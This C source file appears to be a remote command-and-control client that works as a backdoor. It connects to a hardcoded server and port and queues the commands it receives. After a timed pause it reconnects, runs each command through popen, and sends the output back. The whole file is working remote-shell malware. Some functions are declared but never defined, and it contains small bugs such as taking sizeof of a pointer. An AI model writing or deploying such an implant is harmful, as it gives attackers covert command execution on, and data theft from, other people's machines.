#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>

#include "queue/queue.h"

#define TRUE 1
#define PORT "22341"
#define SERV "127.0.0.1"
#define PATH_MAX 100


int createConnection();
int recvCommand(int sock, struct qhead *queue);
int runCmdQueue(struct qhead *queue, int sock);
int sendCmd(int sock, char buffer[]);
void clearBuffer(char *buffer);
void holdUp();
void cleanupFile();
void theCircleOfLife();

int main(int argc, char **argv){

    struct qhead *cmdQueue;
    char *cmdBuf;
    int sock;
    FILE *storage;
    char cwd[PATH_MAX];

    cmdQueue = buildQueue();
    getcwd(cwd, PATH_MAX);


    while(TRUE){

        if((sock = createConnection()) == -1){
            continue;
        }

        while(1){
            if(recvCommand(sock, cmdQueue) == 1){
                break;
            }
        }


        close(sock); // Close existing connection so it's not a constant stream
        holdUp();
        if((sock = createConnection()) == -1){
            continue;
        }

        if(runCmdQueue(cmdQueue, sock) != 0){
            continue;
        }

        close(sock);
    }
    
    return 0; 
}

int createConnection(){
    /* Create IPv4 TCP Socket */
    int sock, numbytes, fails;
    char buf[2048];
    char *output;
    struct addrinfo prime, *ai, *p;
    char s[INET6_ADDRSTRLEN];

    FILE *cmd;
    long lsize;

    struct qhead *cmdQueue;

    memset(&prime, 0, sizeof(prime));
    prime.ai_family = AF_UNSPEC;
    prime.ai_socktype = SOCK_STREAM;

    

    if(getaddrinfo(SERV, PORT, &prime, &ai) != 0){
        return -1;
    }

    for(p = ai; p!= NULL; p = p->ai_next){

        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1){
            continue;
        }

        if(connect(sock, p->ai_addr, p->ai_addrlen) == -1){
            close(sock);
            continue;
        }else{
            return sock;
        }

        break;

    }

    if(p == NULL){
        return -1;
    }

}

int recvCommand(int sock, struct qhead *queue){
    char *buff = (char*)malloc(sizeof(char) * 256);
    unsigned int numBytes;
    
    if((numBytes = recv(sock, buff, 256, 0)) == -1){
        return -1;
    }
    if(strncmp("quit", buff, 4) == 0){
        return 1;
    }else{
        addCmd(queue, buff, sizeof(buff));
        return 0;
    }
}

int runCmdQueue(struct qhead *queue, int sock){
    struct qnode *i;
    char buffer[2048];
    FILE *output;

    for(i = queue->front; i != NULL; i = i->next){
        output = popen(i->cmd, "r");
        sendCmd(sock, i->cmd);
        while(fgets(buffer, 2048, output) != NULL){
            sendCmd(sock, buffer);
        }
        sendCmd(sock, "\n");
        pclose(output);
    }

    return 0;
}

int sendCmd(int sock, char buffer[]){

    if(send(sock, buffer, strlen(buffer), 0) == -1){
        return -1;
    }

    return 0;

}

void clearBuffer(char *buffer){
    int i;
    for(i = 0; i < strlen(buffer); i++){
        buffer[i] = '\0';
    }
}

void holdUp(){
    sleep(10); // Set to whatever time you want :)
}

